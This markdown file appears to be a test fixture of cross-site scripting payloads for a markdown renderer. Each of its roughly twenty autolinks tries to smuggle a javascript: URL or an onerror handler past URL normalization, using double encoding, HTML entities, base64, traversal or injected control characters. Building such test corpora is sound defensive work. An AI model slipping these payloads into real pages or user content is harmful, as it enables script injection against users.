# Double Normalization Attacks

## Attack that survives both autolink and URL normalization
<https://example.com/path?redirect=data:text/html,<img src="x" onerror="alert('double-norm')">

## Autolink with URL that becomes dangerous after double processing
<https://example.com/%252E%252E%252Fjavascript:alert('double-encode')>

## Nested autolink-like structures
<https://example.com/<https://evil.com/javascript:alert('nested')>>

## Autolink with markdown that becomes dangerous after processing
<https://example.com/`![test](javascript:alert('code'))`>

## Autolink with HTML entities that decode to dangerous content
<https://example.com/&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('entities')>

## Autolink with base64 that decodes to dangerous content
<https://example.com/amF2YXNjcmlwdDphbGVydCgnYmFzZTY0Jyk=>

## Autolink with ROT13 that decodes to dangerous content
<https://example.com/wninfpevcg:nyreg('rot13')>

## Autolink that exploits URL constructor edge cases
<https://example.com/../../../../../javascript:alert('constructor')>

## Autolink with directory traversal that bypasses normalization
<https://example.com/safe/../../javascript:alert('traversal')>

## Autolink with percent-encoded directory traversal
<https://example.com/%2E%2E%2Fjavascript:alert('percent-traversal')>

## Autolink with double percent-encoded directory traversal
<https://example.com/%252E%252E%252Fjavascript:alert('double-percent')>

## Autolink with unicode directory traversal
<https://example.com/․․/javascript:alert('unicode-traversal')>

## Autolink with mixed separators
<https://example.com\javascript:alert('mixed-separator')>

## Autolink with null byte injection
<https://example.com/safe%00javascript:alert('null-inject')>

## Autolink with CRLF injection
<https://example.com/safe%0D%0Ajavascript:alert('crlf')>

## Autolink with tab injection
<https://example.com/safe%09javascript:alert('tab')>

## Autolink with space injection
<https://example.com/safe%20javascript:alert('space')>

## Autolink with newline injection
<https://example.com/safe%0Ajavascript:alert('newline')>

## Autolink with multiple encoding layers
<https://example.com/%25256A%25256176%252561%252573%252563%252572%252569%252570%252574%25253A%252561%25256C%252565%252572%252574%252528%252527%25256D%25256C%252574%252569%252527%252529>

## Autolink with scheme case variations
<HTTPS://example.com/javascript:alert('scheme-upper')>
<HtTpS://example.com/javascript:alert('scheme-mixed')>